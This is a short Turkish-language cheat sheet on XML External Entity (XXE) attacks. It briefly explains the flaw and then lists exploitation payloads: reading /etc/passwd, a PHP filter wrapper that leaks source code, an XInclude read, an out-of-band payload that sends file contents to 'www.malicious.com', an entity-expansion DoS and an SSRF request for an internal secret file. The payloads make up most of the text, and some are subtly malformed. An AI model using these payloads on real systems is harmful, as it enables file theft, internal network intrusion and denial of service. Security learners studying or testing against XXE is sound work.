# XXE Nedir
XXE, uygulamanın kullanıcıdan aldığı XML verisini güvenli olmayan bir parser ile işlemesi sonucunda ortaya çıkan bir zafiyettir. Saldırgan ```<!DOCTYPE>``` ve ```<!ENTITY>``` tanımları aracılığıyla dış kaynaklara erişebilir, sunucu üzerindeki dosyaları okuyabilir, iç ağa istek gönderebilir ya da parser’ı kötüye kullanarak DoS saldırıları gerçekleştirebilir.

#  External Entity Nedir
XML işleminde, External Entity bir XML elementidir ve harici bir kaynağa (örneğin bir dosya veya URL) referans verebilir. Eğer güvenli şekilde işlenmezse, XXE açığı oluşur. Bu da saldırganların bu entity’leri kullanarak harici dosyalara erişmesine veya kötü amaçlı sunucu taraflı işlemler gerçekleştirmesine olanak tanır.

## XXE Payload ile External Entity Referansı Örneği
Bir XML payload içerisine XXE eklenerek external entity’ye referans verilebilir.
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

Bu örnekte ```&xxe;```, sunucunun /etc/passwd dosyasına referans verir ve parser yanlış yapılandırıldıysa dosyanın içeriği yanıt olarak döner. Bu saldırılara karşı korunmak için, bu parser’ları güvenli şekilde kullanabilmek adına XXE (External Entities) özelliğini açıkça devre dışı bırakmamız gerekir.

# XXE Zafiyetini Sömürmek
## File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

PHP wrapped:
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<name>Jean &xxe; Dupont</name>
```

Xinclude:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Out Of Band:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]
>
<foo>&callhome;</foo>
```

## DoS
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## SSRF 
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```